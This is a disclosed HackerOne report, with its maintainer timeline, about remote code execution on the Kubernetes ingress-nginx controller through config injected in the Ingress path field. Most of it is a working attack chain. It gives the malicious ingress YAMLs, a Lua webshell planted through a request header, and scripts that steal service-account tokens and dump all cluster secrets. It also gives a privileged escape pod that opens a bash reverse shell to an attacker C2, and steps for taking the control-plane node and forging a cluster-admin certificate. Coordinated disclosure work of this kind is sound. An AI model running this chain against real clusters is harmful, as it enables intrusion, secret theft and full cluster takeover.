---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/cloud
  - stack/kubernetes
  - stack/nginx
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2023-10-26
submitted: 2022-06-30T14:34:17.996Z
bounty_usd: 2500
votes: 47
cve: []
program: "[[programs/kubernetes|Kubernetes]]"
reporter: "ginoah"
source: "https://hackerone.com/reports/1620702"
title: "RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field"
---
# RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field

> **Severity:** High | **Bounty:** 2,500 USD | **Votes:** 47 | **Program:** Kubernetes | **Disclosed:** 2023-10-26

- Report: [https://hackerone.com/reports/1620702](https://hackerone.com/reports/1620702)
- CWE: Code Injection
- Submitted: 2022-06-30T14:34:17.996Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Report Submission Form

## Summary:

A user with ingress create/update privilege may inject config into `nginx.conf` with `path`.
Config the log_format and access_log to write arbitrary file.
Include the file we created to bypass `path` sanitizer to RCE.

## Kubernetes Version:

```
serverVersion:
  buildDate: "2022-03-06T21:32:53Z"
  compiler: gc
  gitCommit: e6c093d87ea4cbb530a7b2ae91e54c0842d8308a
  gitTreeState: clean
  gitVersion: v1.23.4
  goVersion: go1.17.7
  major: "1"
  minor: "23"
  platform: linux/amd64
```

## Component Version:

```
-------------------------------------------------------------------------------
NGINX Ingress controller
  Release:       v1.2.1
  Build:         08848d69e0c83992c89da18e70ea708752f21d7a
  Repository:    https://github.com/kubernetes/ingress-nginx
  nginx version: nginx/1.19.10

-------------------------------------------------------------------------------
```

## Steps To Reproduce:

  1. Create a kind cluster config

lab.yaml
```yaml
kind: Cluster
name: lab
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
# the control plane node config
- role: control-plane
  kubeadmConfigPatches:
  - |
    kind: InitConfiguration
    nodeRegistration:
      kubeletExtraArgs:
        node-labels: "ingress-ready=true"
  extraPortMappings:
  - containerPort: 80
    hostPort: 80
    protocol: TCP
  - containerPort: 443
    hostPort: 443
    protocol: TCP
# the three workers
- role: worker
- role: worker
- role: worker
```

  2. Create a testing cluster with the previous config

```bash
kind create cluster --config lab.yaml
```

  3. Install nginx-ingress-controller

```bash
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml
```

  4. Create a the first malicious ingress

**This ingress will allow attacker to write arbitrary content to arbitrary file.**
(note that the service `not-exist-service` does not need to exist)

write_ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: webexp
spec:
  rules:
    - host: "example.com"
      http:
        paths:
          - path: "/x/ {\n
            }\n
          }\n
          log_format exploit escape=none $http_x_ginoah;\n
          server {\n
            server_name x.x;\n
            listen 80;\n
            listen [::]:80;\n
            location /z/ {\n
                access_log /tmp/luashell exploit;\n
            }\n
            location /x/ {\n
          #"
            pathType: Exact
            backend:
              service:
                name: not-exist-service
                port:
                  number: 8080
```

Apply the first malicious ingress config
```bash
kubectl apply -f write_ingress.yaml
```

  5. Write a malicious lua config to `/tmp/luashell`

Note that in other cluster config, the `localhost` may need to change to ingress-controller's ip.
```bash
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
```

  6. Create a the second malicious ingress

**This ingress will include the malicious lua config, which allow attack to execute arbitrary command.**

webshell_ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: webexp
spec:
  rules:
    - host: "example.com"
      http:
        paths:
          - path: "/x/ {\n
            }\n
          }\n
          log_format exploit escape=none $http_x_ginoah;\n
          server {\n
            server_name x.x;\n
            listen 80;\n
            listen [::]:80;\n
            location /z/ {\n
                include /tmp/luashell;\n
            }\n
            location /x/ {\n
          #"
            pathType: Exact
            backend:
              service:
                name: not-exist-service
                port:
                  number: 8080
```

Apply the second malicious ingress config
```bash
kubectl apply -f webshell_ingress.yaml
```

  7. RCE and get output

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=id"
```

## Supporting Material/References:

  * [attachment / reference]

{F1802462}

## Impact

A cluster user/SA with ingress create/update privilege may Remote Code Execution on `ingress-nginx-controller` pod

After RCE on ingress-nginx-controller the attacker may
- utilize the token to take further action on cluster with ingress's privilege
- eavesdrop the traffic, modify other ingress rule
- DOS
- ...

## Timeline

- **Report Filed**
- **2022-07-01** @h1_analyst_indy: Hi @ginoah,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@chapeau
- **Report Title Updated**
- **Report Vulnerability Types Updated**
- **Report Vulnerability Types Updated**
- **Report Triaged**
- **2022-07-02** @tallclair: From a first read, this looks like it might be a duplicate of CVE-2021-25748 (https://groups.google.com/g/kubernetes-security-announce/c/avaRYa9c7I8). Can you confirm whether you're able to reproduce this on a "fixed" version of ingress-nginx (v1.2.1+)?
- **2022-07-02** @ginoah: Hi, thanks for your reply!
I am testing on the latest version of ingress-nginx (v1.2.1)

In my understanding, CVE-2021-25748 is using something like

```
x/ {
  root #
  /;
  ...
}
location /y/ {
#
```

to bypass the `\s*root\s*.*;` rule check, which allow attacker to read arbitrary file.
And was fixed in [this commit](https://github.com/kubernetes/ingress-nginx/pull/8623/commits/3faba285f509e46d04997f7c0f0597efba5ae8c5) by changing the rule to `(?s)\s*root\s*.*;`.
By setting the s flag to make the `.*` match the `\n` character (`#\n/`)


The current rule ([/internal/ingress/inspector/rules.go](https://github.com/kubernetes/ingress-nginx/blob/main/internal/ingress/inspector/rules.go)) is

```go
invalidAliasDirective = regexp.MustCompile(`(?s)\s*alias\s*.*;`)
invalidRootDirective  = regexp.MustCompile(`(?s)\s*root\s*.*;`)
invalidEtcDir         = regexp.MustCompile(`/etc/(passwd|shadow|group|nginx|ingress-controller)`)
invalidSecretsDir     = regexp.MustCompile(`/var/run/secrets`)
invalidByLuaDirective = regexp.MustCompile(`.*_by_lua.*`)
```

These rules still allow attackers to do a lot of things, for example I use `log_format`, `access_log` and `include` to bypass the `.*_by_lua.*` rule to achieve RCE
- **2022-07-05** @ginoah: Hi there, I spent a little time researching the possible impact.
Since by default, the ingress-nginx service account have permission to read all secret in cluster. We can steal any service account's token.

Then there is multiple possible path for us to take over the whole cluster, for example:
1. Find another service account with `cluster admin` permissions
2. Find another service account with `node` permissions to patch kubelet config
3. Find another service account with `pod` permissions to create/patch a privileged pod, then escape to the control-plane node

The first one is unusual, but the other two are common.
We can find multiple service account with the `node` or `pod` permissions in kind's default setting.
Here is a step-by-step demo that how can we gain RCE on Control-Plane Node after RCE on ingress-nginx-controller using the third method.


# Steps To Reproduce:

1. Generate a kube config with ingress's token

This will generate a k8s config file (ingress.kubeconfig)
(Note that you have to change the server address to your k8s api server's address)

```bash
#!/bin/bash
# You should change this to your server
server=https://127.0.0.1:36923
ingress=http://localhost

ca=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=base64 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -w 0")
token=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token")
namespace=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/namespace")

cat > ingress.kubeconfig << EOF
apiVersion: v1
kind: Config
clusters:
- name: default-cluster
  cluster:
    certificate-authority-data: ${ca}
    server: ${server}
contexts:
- name: default-context
  context:
    cluster: default-cluster
    namespace: default
    user: default-user
current-context: default-context
users:
- name: default-user
  user:
    token: ${token}
EOF
```

2. Dump all service account's token (optional)

```bash
kubectl --kubeconfig ingress.kubeconfig get secrets -A -o=jsonpath='{range .items[?(@.type=="kubernetes.io/service-account-token")]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.data.token}{"\n"}{end}'
```

or simply dump all secret

```bash
kubectl --kubeconfig ingress.kubeconfig get secrets -A -o=json
```

3. Generate a kube config with specific service account

Take `statefulset-controller` as an example, which have `pods  [list watch create delete get patch update]` permission. (default created by kind)
 
(Note that you have to change the server address to your k8s api server's address)
```bash
#!/bin/bash
# You should change this to your server
server=https://127.0.0.1: 36923
sa=statefulset-controller

token=$(kubectl --kubeconfig ingress.kubeconfig get secrets -A -o jsonpath="{range .items[?(@.metadata.annotations['kubernetes\.io/service-account\.name']=='$sa')]}{.data.token}{end}" | base64 --decode)
ca=$(kubectl --kubeconfig ingress.kubeconfig get secrets -A -o jsonpath="{range .items[?(@.metadata.annotations['kubernetes\.io/service-account\.name']=='$sa')]}{.data['ca\.crt']}{end}" )

cat > sa.kubeconfig << EOF
apiVersion: v1
kind: Config
clusters:
- name: default-cluster
  cluster:
    certificate-authority-data: ${ca}
    server: ${server}
contexts:
- name: default-context
  context:
    cluster: default-cluster
    namespace: default
    user: default-user
current-context: default-context
users:
- name: default-user
  user:
    token: ${token}
EOF
```

4. Prepare a c2 server

Listen on port 11337 and wait for reverse shell

```bash
nc -kl 0.0.0.0 11337
```

5. Create a special pod with `statefulset-controller`'s permission

This pod will
- run on Control-Plane node
- privileged: true
- mount host's `/` to `/chroot`
- connect a reverse shell to our c2 server

(Note that you should change `<c2 server's public ip>` to your c2's server ip)

escape_pod.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape-container
    image: ubuntu
    tty: true
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/<c2 server's public ip>/11337 0>&1"]
    volumeMounts:
      - mountPath: /chroot
        name: host
    securityContext:
      privileged: true
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
  nodeSelector:
    ingress-ready: "true"
    kubernetes.io/os: linux
  tolerations:
  - effect: NoSchedule
    key: node-role.kubernetes.io/master
    operator: Equal
  - effect: NoSchedule
    key: node-role.kubernetes.io/control-plane
    operator: Equal
```

Apply the pod with `statefulset-controller`'s service account, the pod will automatically connect to our c2 server

```bash
kubectl --kubeconfig sa.kubeconfig apply -f escape_pod.yaml
```

6. Escape to host (Control-Plane Node) in reverse shell

The host's root is mounted at `/chroot`, so will can simply chroot into it to escape to host (Control-Plane Node)

```bash
chroot /chroot
```

Check the key files of the cluster

```bash
ls /etc/kubernetes/pki/
```

Then we can use these key files to sign a cluster admin account with `system:master` group.


# Impact

A cluster user/SA with ingress create/update permission may
- RCE on Control-Plane Node
- Take over the whole cluster
- **2022-07-20** @ginoah: Hi, @chapeau  @tallclair , is there any update or do you need any further information?
- **2022-07-27** @tallclair: Hi @ginoah. Sorry for the delay. Since ingress-nginx is outside of core-kubernetes there's a bit more back-and-forth required to work with the maintainers.

I was able to get in touch with a maintainer who unfortunately was not able to reproduce your results. I'm still following up with them, but in their case the admission controller was rejecting the patch. Can you confirm that you were running the `ingress-nginx-admission` webhook in your setup?
- **2022-07-27** @tallclair: Also, if you are running the admission webhook, can you confirm which version (container image)?
- **2022-07-28** @ginoah: Hi @tallclair , Thanks for your reply , my image version is 

```
ingress-nginx-controller:
    registry.k8s.io/ingress-nginx/controller:v1.3.0@sha256:d1707ca76d3b044ab8a28277a2466a02100ee9f58a86af1535a3edf9323ea1b5

ingress-nginx-admission-create:
    registry.k8s.io/ingress-nginx/kube-webhook-certgen:v1.1.1@sha256:64d8c73dca984af206adf9d6d7e46aa550362b1d7a01f3a0a91b20cc67868660

ingress-nginx-admission-patch:
    registry.k8s.io/ingress-nginx/kube-webhook-certgen:v1.1.1@sha256:64d8c73dca984af206adf9d6d7e46aa550362b1d7a01f3a0a91b20cc67868660
```

# Script
If there are problems reproducing the results, the files in {F1841996} may be helpful.
Just run `./run.sh` to run the exploit

# Demo 1
Here is the demo video running `run.sh`
{F1841997}


# Demo 2
Here is a more complex demo video, which sequentially do
- Create a cluster with `kind`
- Install ingress-nginx using the `deploy.yaml` on GitHub
- Create a Service Account with only `create` `ingress` privileges
- Use the SA token to create the first ingress (use `curl` instead of `kubectl` to simulate the attack scenario)
- Use `curl` to write the config to the access log
- Use the SA token to create the second ingress by including the config 
- RCE on ingress-nginx-controller with `curl`
- Steal ingress-nginx's SA token from `/var/run/secrets/kubernetes.io/serviceaccount/token`
- Steal statefulset-controller's SA token from `secrets`
- Create a privileged container with statefulset-controller's privileges, restrict it to run on Control-Plane, and mount the host's `/` on `/chroot`
- Escape from the privileged container to the Control-Plane node
- After stealing the cluster's private key, self-sign a certificate with the group 'system:masters'
- Successfully become cluster-admin from an SA account with only `create` `ingress` privileges

{F1841998}
- **External User Joined**
- **2022-08-13** @zhangjintao9020: Thanks for the demo file, I did reproduce the problem.  I will try to dig into this issue and try to fix it.

{F1865405}
- **2022-09-11** @ginoah: Hi @zhangjintao9020, any update on this?
- **Report Severity Updated**
- **2023-01-20** @cjcullen: Hi @ginoah,

Sorry for the delay. The team is finalizing the fix for this, and we are preparing the announcement and CVE. How would you like to be credited in the CVE?
- **Report Severity Updated**
- **2023-01-23** @ginoah: Hi @cjcullen,

Thank you for the information! I would like to be credited as "Ginoah, working with DEVCORE Internship Program".
- **2023-07-09** @ginoah: Hi, @cjcullen, it's bean a while, any update on this?
- **2023-08-03** @cjcullen: Sorry for the delay. We are still finalizing the mitigation instructions we want to provide to users, and hope to get the announcement sent out soon.
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2023-10-26** @ginoah: Thanks for the bounty! Really appreciate it.
